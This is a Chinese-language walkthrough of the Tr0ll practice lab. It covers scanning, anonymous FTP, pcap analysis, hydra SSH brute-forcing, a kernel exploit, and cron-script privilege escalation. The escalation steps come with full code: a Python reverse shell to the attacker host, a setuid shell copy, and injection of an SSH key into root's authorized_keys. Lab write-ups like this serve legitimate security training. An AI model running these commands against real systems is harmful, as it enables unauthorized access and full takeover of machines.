# TR0ll

## 总结

提权思路上，利用内核漏洞提权；找可编辑的计划任务脚本：反弹shell；创建可执行的root文件，获取root权限；写入ssh公钥。

## 思路

思路是来说就是正常的思路，找ip，nmap获取信息，按经验来说看到21ftp，22ssh看到就是想到爆破了，80web页面就是来收集信息或者找有没有web漏洞。获得低权限后提权思路是看内核版本，发现自动推出说明有计划任务，找是否有计划任务可编辑脚本提权

## 大致流程

nmap扫c段找存活主机，发现目标；nmap收集信息；利用端口信息进行信息收集，分析流量包获取有用信息；hydra爆破；提权。



### 具体流程

攻击机ip：10.10.10.128

nmap扫c段找存活主机：nmap -sP 10.10.10.0/24

![image-20230514113403210](https://github.com/wswe/test2/blob/main/image-20230514113403210.png)

 nmap收集信息：nmap 10.10.10.151 -A   发现开启了21 22 80 端口

发现web服务，肯定就先dirb扫一下站点目录

![image-20230514113536350](https://github.com/wswe/test2/blob/main/image-20230514113536350.png)



然后打开网页看看有没有什么有用的信息，会发现都没有，其中有张图片打开用strings分析也没发现什么东西，就换个端口找信息

发现21端口ftp可以匿名登入，且里面有一个流量包文件有读取权限

![image-20230514113637975](https://github.com/wswe/test2/blob/main/image-20230514113637975.png)

登入ftp然后获取lol.pcap 

ftp 10.10.10.151 

账号anonymous登入，密码不用管直接回车就行，dir看文件目录，get是下载

![image-20230514114310466](https://github.com/wswe/test2/blob/main/image-20230514114310466.png)

到下载了lol.pcap的直接wireshark打开（不知道下载到哪了就find / -name lol.pcap） ，

然后右键直接看tcp流，

wireshark lol.pcap

![image-20230514114507187](https://github.com/wswe/test2/blob/main/image-20230514114507187.png)

右键查看tcp流，然后翻译一下，默认是直接先看tpc流id等于0的通信内容，但是这个lol.pcap文件包含了很多tcp流，所以我们要过滤其他id，然后看其中的内容获取有用的信息



id=0

![image-20230514114525145](https://github.com/wswe/test2/blob/main/image-20230514114525145.png)

![image-20230514114536299](https://github.com/wswe/test2/blob/main/image-20230514114536299.png)

![image-20230514114548863](https://github.com/wswe/test2/blob/main/image-20230514114548863.png)

id=1

![image-20230514114608883](https://github.com/wswe/test2/blob/main/image-20230514114608883.png)

id=2

![image-20230514114625885](https://github.com/wswe/test2/blob/main/image-20230514114625885.png)

![image-20230514114637043](https://github.com/wswe/test2/blob/main/image-20230514114637043.png)

获得有用的信息一个是 一个.txt文件 还有一个应该就是目录的的sup3rs3cr3tdirlol，分别在浏览器访问，会发现这个.txt 打不开，然后目录可以打开，然后就下载这个目录上面的roflmao文件

![image-20230514114653807](https://github.com/wswe/test2/blob/main/image-20230514114653807.png)

 用file 分析该文件，发现是一个可行的LSB文件，就直接加给权限，然后执行，发现一个可以登入的地址0x0856BF 

![image-20230514114852618](https://github.com/wswe/test2/blob/main/image-20230514114852618.png)

 进入10.10.10.151/0x0856BF ，打开文件夹，会发现一个是账号一个是密码，而密码文件夹打开是一个good job，然后用把账号文件夹的内容复制作为账号字典，hydra去爆破会发现密码不是这个good job然后用密码的文件夹名试一下，会发现可以。这里为什么会去用hydra爆破ssh的原因是这个靶场就给了3个端口，80没找到有用，21是可以匿名登入，那肯定是爆破22的ssh，正常看到ssh肯定有的思路之一就是爆破，其他的是看openssh的版本号有没有存在的漏洞，这里是直接爆破

![image-20230514114922407](https://github.com/wswe/test2/blob/main/image-20230514114922407.png)

账号文件夹内容

![image-20230514115006280](https://github.com/wswe/test2/blob/main/image-20230514115006280.png)

![image-20230514115029063](https://github.com/wswe/test2/blob/main/image-20230514115029063.png)

密码文件加夹内容

![image-20230514115103015](https://github.com/wswe/test2/blob/main/image-20230514115103015.png)

![image-20230514115111969](https://github.com/wswe/test2/blob/main/image-20230514115111969.png)

hydra 爆破ssh账号密码 

直接 vi  login.txt 然后把账号内容复制进去，然后esc，然后输入   ：wq  保存并退出

然后 hydra -L login.txt -p Pass.txt 10.10.10.151 ssh 

会发现overflow  Pass.txt 爆破成功了
![image-20230514115236640](https://github.com/wswe/test2/blob/main/image-20230514115236640.png)

登入ssh

ssh overflow@10.10.10.151 

![image-20230514115355125](https://github.com/wswe/test2/blob/main/image-20230514115355125.png)

到这里就已经获得了overflow这个权限，下一步就是提权

提权的话  最直接的思路就是直接 看有没有内核漏洞

输入  python -c 'import pty; pty.spawn("/bin/bash")'

获取一个伪shell，方便后续输入

输入uname -a 查看内核版本
![image-20230514115423276](https://github.com/wswe/test2/blob/main/image-20230514115423276.png)

然后用kali去找这个版本号

searchsploit Linux  3.13.0

![image-20230514115631601](https://github.com/wswe/test2/blob/main/image-20230514115631601.png)

然后就是直接去找这个37292.c,locate 定位文件位置

 locate linux/local/37292.c

![image-20230514115704794](https://github.com/wswe/test2/blob/main/image-20230514115704794.png)

 然后可以直接复制到桌面

![image-20230514115759828](https://github.com/wswe/test2/blob/main/image-20230514115759828.png)

然后到桌面目录，打开http服务器

python3 -m http.server 8888

![image-20230514115835265](https://github.com/wswe/test2/blob/main/image-20230514115835265.png)

 然后到ssh登入进去的伪shell里面用wget来下载桌面上的37292.c文件，这里要注意直接在伪shell的默认目录下是不允许直接wget文件的，所以我们要到tmp目录下面去

cd tmp

wget http://10.10.10.151:8888/37292.c    (这里我攻击机的ip是10.10.10.128，开启了8888，且该目录下直接有37292.c  所以是这么写)
![image-20230514115924838](https://github.com/wswe/test2/blob/main/image-20230514115924838.png)

然后就是编译37292.c 然后执行就提权成功了

 gcc 37292.c -o test

./test

![image-20230514120000234](https://github.com/wswe/test2/blob/main/image-20230514120000234.png)

到这里，第一种最简单直观的提权就结束了

后面讲另外的提权方法：

我们会发现我们这个overf获得的shell会在一段时候后自动断开连接像这样，说明可能有计划任务在跑，所以这就是另一个思路了，把能获取shell命令的代码放进去跑。这个思路下，第一步我们要干的是先去看cronlog日志，然后找有没有可以编辑的脚本文件，然后去修改这个可以编辑的脚本内容
![image-20230514120022437](https://github.com/wswe/test2/blob/main/image-20230514120022437.png)

找cronlog

find / -name cronlog 2>/dev/null   

查看cat cronlog，发现cleaner.py脚本

cat cleaner.py 脚本

![image-20230514120041097](https://github.com/wswe/test2/blob/main/image-20230514120041097.png)

试一下能不能vi 直接改这个脚本发现不行

然后用nano 修改这个脚本。

到这里可以修改脚本内容后，就欧三种思路可以都提权获取

一种是写脚本反弹shell，我们攻击机监听即可  

一种是创建可执行root权限文件，间接获取root权限

一种是写入攻击机的ssh公钥，然后攻击机直接用私钥连接

修改脚本内容反弹shell：

攻击机先： nc -tvlp 9999
![image-20230514120104921](https://github.com/wswe/test2/blob/main/image-20230514120104921.png)

nano /lib/log/cleaner.py  编辑脚本讲内容改为

```
#!/usr/bin/python
def con():
    import socket, time,pty, os
    host='攻击机ip'
    port=攻击机监听端口
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host,port))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
con()]()

然后crtl x
```

退出   然后按y选择保存修改 然后回车  等待脚本被执行即可
![image-20230514120135311](https://github.com/wswe/test2/blob/main/image-20230514120135311.png)

脚本执行连接攻击机，然后我们就提权成功了

![image-20230514120204799](https://github.com/wswe/test2/blob/main/image-20230514120204799.png)

修改脚本内容创建可执行root权限文件提权：

一样的 nano /lib/log/cleaner.py编辑，然后修改脚本为

```
[#!/usr/bin/env python
import os
import sys
try:
   os.system('cp /bin/sh /tmp/test2')
   os.system('chmod u+s /tmp/test2')
except:
      sys.exit()]()
```

![image-20230514120227043](https://github.com/wswe/test2/blob/main/image-20230514120227043.png)

然后去到tmp下面执行这个test2文件就行

![image-20230514120244146](https://github.com/wswe/test2/blob/main/image-20230514120244146.png)

编辑脚本写入攻击机ssh公钥提权：

先获取我们攻击机的ssh公钥

ssh-keygen  然后一直回车就行

然后到目录去找ssh公钥

cd ~/.ssh
cat id_rsa.pub

![image-20230514120303396](https://github.com/wswe/test2/blob/main/image-20230514120303396.png)

 然后将 id_rsa.pub 这个文件的内容加入到一下代码

```
[mkdir /root/.ssh; chmod 775 .ssh; echo "加入id_rsa.pub的内容" >> /root/.ssh/authorized_keys]()
```

然后就是修改脚本内容 把os.system('上述代码串')
![image-20230514120320300](https://github.com/wswe/test2/blob/main/image-20230514120320300.png)

稍等脚本生效，然后用攻击机的私钥直接去连接10.10.10.151就行了

ssh -i /root/.ssh/id_rsa root@10.10.10.151

-i 攻击机私钥和id_rsa.pub 在一个文件夹里   这里@前注意用你的用户去登入了，现在是用我们自己攻击的账号的私钥去连接10.10.10.151了 和那个overflow用户无关了
 ![image-20230514120340495](https://github.com/wswe/test2/blob/main/image-20230514120340495.png)

综上就是这个Tr0ll靶场的知识点了
